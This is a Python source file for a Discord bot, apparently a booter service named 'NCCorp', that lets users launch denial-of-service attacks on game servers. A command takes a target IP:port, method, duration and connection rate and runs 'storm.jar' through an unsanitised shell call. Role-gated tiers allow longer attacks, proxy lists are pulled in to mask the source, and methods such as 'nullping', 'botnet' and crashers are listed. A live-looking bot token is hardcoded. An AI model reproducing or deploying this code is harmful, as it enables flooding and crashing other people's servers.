import asyncio
import discord
from discord.ext import commands
from subprocess import Popen
from os import system
from time import sleep
from random import randint

proxyMode = input('ProxyMode (s, u): ')

def update():
    system('rm proxies.txt')
    system(
        'curl -o proxies-0.txt "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"')
    system('curl -o proxies-1.txt "https://cdn.discordapp.com/attachments/935122416735236126/991426571766341662/proxies_2.txt"')
    system('curl -o proxies-2.txt "https://cdn.discordapp.com/attachments/935122416735236126/991426595359313940/proxies.txt"')
    f = open('proxies.txt', 'w+')
    f1 = open('proxies-0.txt', 'r')
    f2 = open('proxies-1.txt', 'r')
    f3 = open('proxies-2.txt', 'r')
    f.write(f1.read() + f2.read() + f3.read())
    f.close()
    print('Proxy Updated')


if proxyMode == 's':
    pass
elif proxyMode == 'u':
    update()

def cpuCoreSelect():
	rc = randint(0, 9)
	return 'taskset -a -c {}'.format(rc)

client = commands.Bot(command_prefix='$', help_command=None)
methods_all = ['join',
               'legitjoin',
               'localhost',
               'invaldnames',
               'longnames',
               'power',
               'spoof',
               'spam',
               'killer',
               'nullping',
               'charonbot',
               'packet',
               'queue',
               'sf',
               'ultimatesmasher',
               'nabcry',
               'colorcrasher',
               'yoonikscry',
               'nettydowner',
               'bigpacket',
               'network',
               'bighandshake',
               'randombytes',
               'botjoiner',
               'ping',
               'multikiller',
               'extremejoin',
               'spamjoin',
               'ram',
               'botnet']
# web_role = 991599142730219611
# wmeth_list = ['STRESS', 'POST', 'CFB', 'GET', 'BYPASS', 'BOT', 'HEAD', 'DYN', 'CFBUAM', 'EVEN', 'NULL', 'COOKIE',
#               'SLOW', 'DOWNLOADER', 'XMLRPC', 'KILLER', 'STOMP']

@client.command(name='attack')
async def att_(ctx, ipport, prot, meth, time, cps):
    if ctx.channel.id == 990945754245902366:
        if meth in methods_all:
            if int(time) < 41:
                embed=discord.Embed(title='NCCorp')
                embed.add_field(name='IP:Port', value=f'{ipport}', inline=False)
                embed.add_field(name='Protocol', value=f'{prot}', inline=False)
                embed.add_field(name='Method', value=f'{meth}', inline=False)
                embed.add_field(name='Time', value=f'{time}', inline=False)
                embed.add_field(name='CPS', value=f'{cps}', inline=False)
                Popen(f'java -Xmx4G -jar storm.jar {ipport} {prot} {meth} {time} {cps}', shell=True)
                await ctx.send(embed=embed)
            else:
                await ctx.send(f'<@{ctx.author.id}>, Ты указал слишком большое время! Максимум - 40 секунд')
        else:
            await ctx.send('Ты указал неверный метод! Посмотри методы в канале Methods')
@client.command(name='premium')
@commands.has_role(990952908436680764)
async def att_(ctx, ipport, prot, meth, time, cps):
    if ctx.channel.id == 990946587754758234:
        if meth in methods_all:
            if int(time) < 70:
                embed=discord.Embed(title='NCCorp')
                embed.add_field(name='IP:Port', value=f'{ipport}', inline=False)
                embed.add_field(name='Protocol', value=f'{prot}', inline=False)
                embed.add_field(name='Method', value=f'{meth}', inline=False)
                embed.add_field(name='Time', value=f'{time}', inline=False)
                embed.add_field(name='CPS', value=f'{cps}', inline=False)
                Popen(f'java -Xmx4G -jar storm.jar {ipport} {prot} {meth} {time} {cps}', shell=True)
                await ctx.send(embed=embed)
            else:
                await ctx.send(f'<@{ctx.author.id}>, Ты указал слишком большое время! Максимум - 70 секунд')
        else:
            await ctx.send(f'<@{ctx.author.id}>, Ты указал неверный метод! Посмотри методы в канале Methods')
    else:
        await ctx.send(f'<@{ctx.author.id}>, Ты написал команду в неверном канале!')

@client.command(name='admin')
@commands.has_role(990947770292650025)
async def att_(ctx, ipport, prot, meth, time, cps):
    if meth in methods_all:
        embed=discord.Embed(title='NCCorp')
        embed.add_field(name='IP:Port', value=f'{ipport}', inline=False)
        embed.add_field(name='Protocol', value=f'{prot}', inline=False)
        embed.add_field(name='Method', value=f'{meth}', inline=False)
        embed.add_field(name='Time', value=f'{time}', inline=False)
        embed.add_field(name='CPS', value=f'{cps}', inline=False)
        Popen(f'java -Xmx4G -jar storm.jar {ipport} {prot} {meth} {time} {cps}', shell=True)
        await ctx.send(embed=embed)
client.run("OTkwOTc0NzAwODkxMDEzMjAx.GWHdk-.AT8tEE1a0JDddHiN_tUiDQDMpzcE9rz_hcaT8E")
